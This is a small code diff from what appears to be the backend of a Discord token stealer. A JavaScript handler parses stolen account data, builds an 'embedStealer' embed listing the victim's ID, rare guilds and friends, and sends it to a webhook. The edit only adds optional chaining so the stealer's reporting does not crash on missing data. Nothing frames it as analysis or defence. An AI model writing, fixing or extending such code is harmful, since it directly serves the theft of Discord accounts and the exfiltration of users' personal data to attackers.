@@ -33,7 +33,7 @@ export default async function handler(req, res) {
     const guilds = DiscordToken(data).guilds.rares; 
     const friends = DiscordToken(data).friends.rares;
     const embed = await getEmbed();
-    const embedBuilder = infos.ID ? embedStealer(infos, guilds, friends, data, embed) : embedRaw(data, embed);
+    const embedBuilder = infos?.ID ? embedStealer(infos, guilds, friends, data, embed) : embedRaw(data, embed);
 
     await webhook.send({
       embeds: [embedBuilder],
